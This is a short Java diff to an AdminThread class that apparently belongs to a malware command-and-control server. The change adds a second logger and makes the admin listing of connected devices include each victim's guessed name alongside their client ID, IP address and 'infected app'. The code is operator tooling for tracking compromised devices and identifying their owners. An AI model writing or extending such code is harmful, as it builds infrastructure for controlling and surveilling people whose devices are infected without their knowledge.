@@ -8,13 +8,14 @@ import java.util.ArrayList;
 
 public class AdminThread implements Runnable {
 
-    private Logger logger;
+    private Logger logger, threadLogger;
     private DataInputStream in = null;
     private Socket socket;
 
     public AdminThread(Socket socket) {
         this.socket = socket;
         logger = new Logger(Logger.LOG_TYPE_NORMAL, "admin_" + socket.getInetAddress());
+        threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "admin_" + socket.getInetAddress());
     }
 
     @Override
@@ -62,12 +63,15 @@ public class AdminThread implements Runnable {
                     StringBuilder sb = new StringBuilder();
                     sb.append(i);
                     sb.append(": ");
+                    sb.append(ConnectionHandler.clientThreads.get(i).getGuessedNames().get(0));
+                    sb.append(" ");
                     sb.append(ConnectionHandler.clientThreads.get(i).getClientID());
                     sb.append(ConnectionHandler.clientThreads.get(i).getSocket().getInetAddress());
                     sb.append(" ");
                     sb.append(ConnectionHandler.clientThreads.get(i).getInfectedApp());
                     logger.log(sb.toString());
                 }
+                threadLogger.log("");
             } else {
                 logger.log("No connected devices");
             }
